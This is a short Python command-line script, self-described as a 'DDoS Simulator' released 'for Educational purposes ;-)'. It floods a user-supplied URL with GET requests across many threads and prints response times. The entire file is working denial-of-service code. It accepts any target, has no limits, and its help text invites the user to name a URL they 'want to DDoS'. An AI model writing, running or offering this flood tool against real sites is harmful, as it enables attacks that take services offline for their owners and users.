import requests
from requests.exceptions import ConnectionError
import argparse
import threading
import time

threads = []

def ddos(times, threadNumber, url):
    best = 10
    worst = 0
    
    for i in range(times):
        start = time.time()
        requests.get(url)
        end = time.time()
        tme = end - start
        if tme > worst:
            worst = tme
        elif tme < best:
            best = tme

    print("Best in thread #" + str(threadNumber) + ": " + str(best)+" seconds")
    print("Worst in thread #" + str(threadNumber) + ": " + str(worst)+" seconds")

def summonThreads(threadNumber, url, requestsPerThread):
    for i in range(threadNumber):
        try:
            t = threading.Thread(target=ddos, args=(requestsPerThread, i, url))
            threads.append(t)
            t.start()
        except ConnectionError:
            print("Thread #"+str(i)+" failed connecting. Too long to respond.")
        except Exception as e:
            print("Thread #"+str(i)+" failed: "+str(e))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='DDoS for Educational purposes ;-)')

    parser.add_argument('--url', help='A URL, which you want to DDoS')
    parser.add_argument('-t', help='How many threads? [an INT]')
    parser.add_argument('--rpt', help='Requests per thread [an INT]')

    args = parser.parse_args()

    if args.rpt:
        rpt = int(args.rpt)
    else:
        raise ValueError("No Requests per Thread specified. Please specify it with --rpt")

    if args.t:
        threadNum = int(args.t)
    else:
        raise ValueError("No Threads specified. Please specify number of threads with -t")

    if args.url:
        url = args.url
    else:
        raise ValueError("No URL specified. Please specify it with --url")

    print("DDoS Simulator 1.0 - Python")
    print("by @mytja - https://github.com/mytja")
    print("MIT License")
    print("-----------")
    print("DDoS simulator is running! Please wait")

    summonThreads(threadNum, url, rpt)
    
